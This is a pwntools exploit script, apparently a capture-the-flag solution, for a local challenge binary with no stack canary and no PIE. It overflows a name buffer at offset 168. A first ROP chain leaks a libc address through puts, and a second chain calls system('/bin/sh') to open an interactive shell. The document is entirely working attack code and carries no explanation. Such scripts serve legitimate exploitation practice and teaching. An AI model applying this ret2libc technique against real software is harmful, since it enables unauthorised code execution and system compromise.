#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chall
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chall_patch')
libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX unknown - GNU_STACK missing
# PIE:        No PIE (0x400000)
# Stack:      Executable
# RWX:        Has RWX segments
# Stripped:   No
# Debuginfo:  Yes
p = start()

def bof(payload):
    p.sendlineafter(b'Choice: ',b'1')
    p.sendlineafter(b'rounds: ',b'1')
    p.sendlineafter(b'in?',b'1')
    p.sendlineafter(b'name: ',payload)

rop = ROP(exe)

offset = 168
payload = flat({offset:
    [rop.ret.address,
    0x401040,
    exe.plt.puts,
    exe.sym.main
    ]})

bof(payload)
p.sendline(b'3')

p.recvuntil(b'Goodbye!\n')
libc.address = u64(p.recvline().strip().ljust(8,b'\x00')) - libc.sym.funlockfile
success(f'libc base @ {hex(libc.address)}')

rop2 = ROP(libc)
rop2.raw(rop2.ret.address)
rop2.system(next(libc.search(b'/bin/sh\0')))
bof(flat({offset:rop2.chain()}))
p.sendline(b'3')

p.interactive()

